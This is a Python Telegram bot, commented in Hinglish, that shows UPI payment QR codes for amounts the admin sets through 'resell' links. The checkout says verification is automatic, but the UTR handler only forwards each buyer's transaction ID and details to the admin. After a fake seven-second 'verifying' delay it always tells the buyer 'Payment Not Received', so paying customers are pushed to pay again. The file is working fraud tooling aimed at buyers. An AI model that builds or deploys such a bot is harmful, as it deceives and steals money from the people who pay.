import telebot
from telebot import types
import qrcode
import io
import time
import secrets
import sqlite3
from flask import Flask
import threading
app = Flask('')
@app.route('/')
def home(): return "Bot is Alive"
def run_flask(): app.run(host='0.0.0.0', port=80)
    
# ==================== CONFIGURATION ====================
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"  # BotFather ka token yahan dalein
ADMIN_ID = 123456789  # Apni real numeric Telegram Admin ID dalein
YOUR_UPI_ID = "BHARATPE.8B0Q0G6C4W79292@fbpe"
BOT_USERNAME = "SkyBoxx_bot"

# =======================================================

bot = telebot.TeleBot(BOT_TOKEN)

# --- DATABASE SETUP ---
# Database file create aur initialize karne ka function
def init_db():
    conn = sqlite3.connect('bot_data.db')
    cursor = conn.cursor()
    # Links table: Agar bot restart bhi ho jaye, data safe rahega
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS links (
            token TEXT PRIMARY KEY,
            amount INTEGER
        )
    ''')
    conn.commit()
    conn.close()

# Database ko initial start pe run karein
init_db()

# UPI QR Code generator function
def generate_upi_qr(upi_id, amount):
    upi_url = f"upi://pay?pa={upi_id}&am={amount}&cu=INR"
    qr = qrcode.QRCode(version=1, box_size=10, border=4)
    qr.add_data(upi_url)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    
    img_byte_arr = io.BytesIO()
    img.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    return img_byte_arr

# --- ADMIN COMMAND: Permanent Link Generate Karein ---
@bot.message_handler(commands=['gen'])
def generate_link(message):
    if message.from_user.id != ADMIN_ID:
        
        return  # Sirf admin access
        
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        bot.reply_to(message, "❌ Sahi format use karein: `/gen <amount>`\nExample: `/gen 82`", parse_mode="Markdown")
        return
        
    amount = int(args[1])
    
    # Safe aur secure token generate karein
    unique_token = secrets.token_hex(6)
    
    # Database me save karein (Permanent Storage)
    conn = sqlite3.connect('bot_data.db')
    cursor = conn.cursor()
    cursor.execute('INSERT INTO links (token, amount) VALUES (?, ?)', (unique_token, amount))
    conn.commit()
    conn.close()
    
    link = f"https://t.me{BOT_USERNAME}?start=resell_{unique_token}"
    bot.reply_to(message, f"✅ *Permanent Link Generated for ₹{amount}:*\n\n`{link}`", parse_mode="Markdown")

# --- USER COMMAND: Jab koi permanent link open karega ---
@bot.message_handler(commands=['start'])
def handle_start(message):
    text_args = message.text.split()
    amount = 80  # Default amount
    
    if len(text_args) > 1 and text_args[1].startswith("resell_"):
        token = text_args[1].replace("resell_", "")
        
        # Database se check karein ki yeh token kis amount ka hai
        conn = sqlite3.connect('bot_data.db')
        cursor = conn.cursor()
        cursor.execute('SELECT amount FROM links WHERE token = ?', (token,))
        row = cursor.fetchone()
        conn.close()
        
        if row:
            amount = row[0]

    # 1. Loading message
    loading_msg = bot.send_message(message.chat.id, "⏳ *Preparing secure checkout...*", parse_mode="Markdown")
    
    # 2. QR stream generate karein
    qr_img = generate_upi_qr(YOUR_UPI_ID, amount)
    
    caption_text = (
        f"Pay ₹{amount} for the item\n\n"
        f"UPI ID — {YOUR_UPI_ID}\n\n"
        f"Instructions:\n"
        f"• Scan this QR or copy the UPI ID\n"
        f"• Pay exactly ₹{amount} within 10 minutes\n"
        f"Verification is automatic.\n"
        f"• After payment, please submit 12 digit UTR/Transaction id."
    )
    
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("📥 Submit UTR", callback_data=f"sub_{amount}")
    markup.add(btn)
    
    # 3. QR send aur loading text delete
    bot.send_photo(message.chat.id, qr_img, caption=caption_text, reply_markup=markup)
    try:
        bot.delete_message(message.chat.id, loading_msg.message_id)
    except Exception:
        pass

# --- BUTTON CLICK CALLBACK ---
@bot.callback_query_handler(func=lambda call: call.data.startswith("sub_"))
def ask_utr_input(call):
    bot.answer_callback_query(call.id)
    amount = call.data.replace("sub_", "")
    
    msg = bot.send_message(
        call.message.chat.id, 
        f"✍️ Apna ₹{amount} ka **12 digit UTR / Transaction ID** niche type karke send karein:", 
        parse_mode="Markdown",
        reply_markup=types.ForceReply(selective=True)
    )
    bot.register_next_step_handler(msg, verify_and_log_utr, amount)

# --- UTR PROCESSING ---
def verify_and_log_utr(message, amount):
    utr = message.text.strip()
    user_id = message.from_user.id
    username = message.from_user.username or "No Username"
    first_name = message.from_user.first_name
    
    if not (len(utr) == 12 and utr.isdigit()):
        bot.reply_to(message, "❌ Invalid UTR! Kripya 12-digit ka number enter karein.")
        return

    # Admin Alert Notification
    admin_alert = (
        f"📥 *New UTR Received!*\n\n"
        f"👤 User: {first_name} (@{username})\n"
        f"🆔 User ID: `{user_id}`\n"
        f"💰 Amount: ₹{amount}\n"
        f"📄 UTR Number: `{utr}`"
    )
    try:
        bot.send_message(ADMIN_ID, admin_alert, parse_mode="Markdown")
    except Exception as e:
        print(f"Admin log failed: {e}")

    # User Processing Status
    verifying_msg = bot.reply_to(message, "🔄 _payment ya transaction verifying..._", parse_mode="Markdown")
    
    time.sleep(7) # 7 second delay
    
    try:
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=verifying_msg.message_id,
            text="Payment Not Received ❌\nPlease Try Again.."
        )
    except Exception:
        bot.send_message(message.chat.id, "Payment Not Received ❌\nPlease Try Again..")

if __name__ == '__main__':
    init_db()
    threading.Thread(target=run_flask).start()
    print("SkyBoxx_bot running on free tier...")
    bot.infinity_polling()
